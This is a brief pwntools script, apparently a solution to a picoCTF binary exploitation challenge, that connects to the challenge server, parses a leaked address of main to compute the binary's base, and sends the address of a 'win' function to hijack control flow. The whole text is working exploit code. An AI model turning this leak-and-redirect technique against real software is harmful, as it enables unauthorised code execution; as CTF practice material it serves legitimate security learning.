from pwn import *
exe = context.binary = ELF("./vuln")
r = process()
r = remote("rescued-float.picoctf.net", 53103)
rop = ROP(exe)
r.recvuntil(b"Address of main: ")
leak_main = int(r.recvline().strip().decode(),16)
print(hex(leak_main))
exe.address = leak_main - exe.sym['main']
print(hex(exe.address))
r.sendline(hex(exe.sym['win']))
r.interactive()
